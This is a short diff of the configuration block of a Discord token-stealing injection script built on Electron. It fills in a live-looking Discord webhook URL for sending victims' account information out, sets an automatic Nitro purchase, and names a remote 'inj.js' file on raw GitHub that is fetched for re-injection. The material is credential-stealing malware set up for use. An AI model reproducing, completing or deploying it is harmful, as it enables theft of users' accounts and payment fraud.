@@ -7,15 +7,15 @@ const { BrowserWindow, session } = require("electron");
 const config = {
   auto_buy_nitro: true,
   ping_on_run: true, 
-  ping_val: "@everyone", //change to @here or <@ID> 
-  embed_name: "muahahah", //name of the webhook thats 
+  ping_val: "@everyone",
+  embed_name: "muahahah",
   embed_icon:
     "hhttps://cdn.discordapp.com/avatars/962118534937346159/e841d8e25ad464d338d31f7b4d26b7c0.webp?size=128".replace(
       / /g,
       "%20",
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "%WEBHOOK%", //your discord webhook there obviously
+  webhook: "https://discord.com/api/webhooks/966635734637359145/sVsd9CIJXMUMHx1MKzvhEYSeY3YrbZovqlQOxLxHx_z0GjQ_vOOCkmMa3_FWUI3hf3Fy", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/mte0/g/main/inj.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
